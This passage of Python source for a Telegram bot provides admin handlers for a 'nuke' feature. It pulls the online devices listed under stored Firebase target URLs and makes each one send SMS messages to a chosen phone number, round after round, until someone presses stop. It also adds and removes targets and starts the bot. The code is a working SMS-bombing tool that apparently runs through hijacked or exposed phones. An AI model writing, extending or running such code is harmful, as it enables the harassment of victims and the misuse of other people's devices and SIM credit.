                        "ORDER BY online_count DESC LIMIT 1", fetch="one")
            if not row:
                await state.clear()
                return await m.answer("No targets.")
            fid = row["id"]
        t = _exec("SELECT * FROM firebase_targets WHERE id=?", (fid,),
                  fetch="one")
        if not t:
            await state.clear()
            return await m.answer("Not found.")
        await state.update_data(nuke_fid=fid)
        await state.set_state(AdminFSM.fb_nuke_number)
        await m.answer(
            f"💣 Nuke on <b>{t['name'][:30]}</b>\n\nTarget number?")
    except Exception:
        log.exception("nuke fid")


@dp.message(AdminFSM.fb_nuke_number, F.text)
async def fsm_fb_nuke_number(m: types.Message, state: FSMContext):
    try:
        if not is_admin(m.from_user.id):
            return await state.clear()
        txt = (m.text or "").strip()
        if txt.startswith("/"):
            return await state.clear()
        digits = "".join(c for c in txt if c.isdigit())
        if len(digits) < 10:
            return await m.answer("Invalid.")
        await state.update_data(number=digits[-10:])
        await state.set_state(AdminFSM.fb_nuke_msg)
        await m.answer("Send the message body.")
    except Exception:
        log.exception("nuke num")


@dp.message(AdminFSM.fb_nuke_msg, F.text)
async def fsm_fb_nuke_msg(m: types.Message, state: FSMContext):
    try:
        if not is_admin(m.from_user.id):
            return await state.clear()
        txt = (m.text or "").strip()
        if txt.startswith("/"):
            return await state.clear()
        d = await state.get_data()
        fid = d.get("nuke_fid")
        number = d.get("number")
        await state.clear()
        t = _exec("SELECT * FROM firebase_targets WHERE id=?", (fid,),
                  fetch="one")
        if not t:
            return await m.answer("Missing.")
        stop_ev = asyncio.Event()
        FB_SEND_STOPS[m.from_user.id] = stop_ev
        status = await m.answer(
            f"💣 <b>NUKE</b>\n\n🎯 <code>{number}</code>\n"
            f"📨 <code>{txt[:50]}</code>",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="🛑 Stop nuke",
                                      callback_data="f:stop")]
            ]))
        asyncio.create_task(_run_nuke(status, m.from_user.id, t, number,
                                       txt[:200], stop_ev))
    except Exception:
        log.exception("nuke msg")


async def _run_nuke(status_msg, uid, t, number, message, stop_ev):
    try:
        last_update = [0.0]
        total_rounds = [0]
        total_sent = [0]

        async def progress(done, total, sent):
            n = time.time()
            if n - last_update[0] < 1.5:
                return
            last_update[0] = n
            try:
                await status_msg.edit_text(
                    f"💣 <b>NUKE</b>\n\n"
                    f"🎯 <code>{number}</code>\n"
                    f"Round: <b>{total_rounds[0] + 1}</b> · "
                    f"Sent: <b>{total_sent[0] + sent}</b>",
                    reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                        [InlineKeyboardButton(text="🛑 Stop",
                                              callback_data="f:stop")]
                    ]))
            except Exception:
                pass

        while not stop_ev.is_set():
            connector = aiohttp.TCPConnector(ssl=False, limit=100,
                                              limit_per_host=30)
            session = aiohttp.ClientSession(connector=connector)
            try:
                devs, err = await fb_fetch_clients(session, t["url"],
                                                    max_devices=400)
                if err:
                    break
                online = [d for d in devs if d["is_online"]]
                sem = asyncio.Semaphore(30)
                sent_r = [0]

                async def fire_one(dv):
                    if stop_ev.is_set():
                        return
                    slots = dv["sims"] or [0]
                    slot = slots[0] if slots else 0
                    async with sem:
                        ok = await fb_send_sms(session, t["url"],
                                                dv["dev_id"], slot,
                                                number, message)
                    if ok:
                        sent_r[0] += 1

                await asyncio.gather(*(fire_one(d) for d in online),
                                     return_exceptions=True)
                total_sent[0] += sent_r[0]
                total_rounds[0] += 1
                await progress(0, 0, sent_r[0])
            finally:
                try:
                    await session.close()
                except Exception:
                    pass
            await asyncio.sleep(0.5)

        try:
            await status_msg.edit_text(
                f"{'🛑 Stopped' if stop_ev.is_set() else '✅'} "
                f"<b>Nuke ended</b>\n\n"
                f"🎯 <code>{number}</code>\n"
                f"📨 Total sent: <b>{total_sent[0]}</b>\n"
                f"🔁 Rounds: <b>{total_rounds[0]}</b>",
                reply_markup=admin_back_kb())
        except Exception:
            pass
        log_action(uid, "fb_nuke",
                   f"fid={t['id']} sent={total_sent[0]} "
                   f"rounds={total_rounds[0]}")
    except Exception:
        log.exception("nuke report")
    finally:
        FB_SEND_STOPS.pop(uid, None)


@dp.callback_query(F.data == "a:fb_add")
async def cb_fb_add(c: types.CallbackQuery, state: FSMContext):
    try:
        if not is_admin(c.from_user.id):
            return await c.answer("no", show_alert=True)
        await state.set_state(AdminFSM.fb_add_url)
        await c.message.edit_text(
            "➕ Send the firebase URL.",
            reply_markup=admin_back_kb())
    except Exception:
        log.exception("fb add prompt")
    finally:
        await c.answer()


@dp.message(AdminFSM.fb_add_url, F.text)
async def fsm_fb_add(m: types.Message, state: FSMContext):
    try:
        if not is_admin(m.from_user.id):
            return await state.clear()
        txt = (m.text or "").strip()
        if txt.startswith("/"):
            return await state.clear()
        url = _norm_fb_url(txt)
        if not url or "://" not in url:
            return await m.answer("Send valid URL.")
        try:
            host = url.split("//", 1)[1].rstrip("/")
        except Exception:
            host = url
        name = host[:120]
        clash = _exec("SELECT 1 FROM firebase_targets WHERE name=?",
                      (name,), fetch="one")
        if clash:
            name = name[:100] + "_" + str(abs(hash(url)))[:8]
        try:
            _exec("INSERT OR IGNORE INTO firebase_targets(name,url,active,"
                  "created_at) VALUES(?,?,1,?)",
                  (name, url, int(time.time())))
            await m.answer(f"✅ Added <code>{url}</code>",
                           reply_markup=admin_kb())
        except Exception as e:
            await m.answer(f"❌ {str(e)[:100]}")
        await state.clear()
    except Exception:
        log.exception("fb add")


@dp.callback_query(F.data == "a:fb_remove")
async def cb_fb_remove(c: types.CallbackQuery, state: FSMContext):
    try:
        if not is_admin(c.from_user.id):
            return await c.answer("no", show_alert=True)
        await state.set_state(AdminFSM.fb_remove_id)
        await c.message.edit_text("Send firebase ID.",
                                  reply_markup=admin_back_kb())
    except Exception:
        log.exception("fb remove prompt")
    finally:
        await c.answer()


@dp.message(AdminFSM.fb_remove_id, F.text)
async def fsm_fb_remove(m: types.Message, state: FSMContext):
    try:
        if not is_admin(m.from_user.id):
            return await state.clear()
        txt = (m.text or "").strip()
        if txt.startswith("/"):
            return await state.clear()
        if not txt.isdigit():
            return await m.answer("Numeric.")
        fid = int(txt)
        _exec("DELETE FROM firebase_targets WHERE id=?", (fid,))
        _exec("DELETE FROM firebase_devices WHERE firebase_id=?", (fid,))
        await state.clear()
        await m.answer(f"✅ Removed {fid}", reply_markup=admin_kb())
    except Exception:
        log.exception("fb remove")


# ─────────────────────────────────────────────────────────────
# HEALTH
# ─────────────────────────────────────────────────────────────
async def _health_handler(request):
    return aiohttp.web.Response(
        text="OK", content_type="text/plain", status=200)


async def _run_health_server():
    app = aiohttp.web.Application()
    app.router.add_get("/", _health_handler)
    runner = aiohttp.web.AppRunner(app)
    await runner.setup()
    try:
        site = aiohttp.web.TCPSite(runner, host="0.0.0.0", port=PORT)
        await site.start()
        log.info("health server on 0.0.0.0:%d", PORT)
    except OSError as e:
        log.error("health bind failed: %s", e)
        await runner.cleanup()
        return
    try:
        await asyncio.Event().wait()
    finally:
        await runner.cleanup()


# ─────────────────────────────────────────────────────────────
# STARTUP
# ─────────────────────────────────────────────────────────────
async def _periodic_prune():
    while True:
        try:
            prune_logs()
        except Exception:
            log.exception("prune failed")
        await asyncio.sleep(6 * 3600)


async def main():
    try:
        init_db()
        a = _exec("SELECT COUNT(*) c FROM apis", fetch="one")["c"]
        f = _exec("SELECT COUNT(*) c FROM firebase_targets", fetch="one")["c"]
        log.info("bot starting | port=%d | apis=%d | firebase=%d",
                 PORT, a, f)
        await bot.delete_webhook(drop_pending_updates=True)

        prune_task = asyncio.create_task(_periodic_prune())
        health_task = asyncio.create_task(_run_health_server())

        try:
            await dp.start_polling(bot)
        finally:
            for t in (health_task, prune_task):
                if t and not t.done():
                    t.cancel()
            for t in (health_task, prune_task):
                try:
                    await t
                except (asyncio.CancelledError, Exception):
                    pass
            try:
                await bot.session.close()
            except Exception:
                pass
            try:
                _conn.close()
            except Exception:
                pass
    except Exception as e:
        log.exception("main crashed: %s", e)


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except (KeyboardInterrupt, SystemExit):
        pass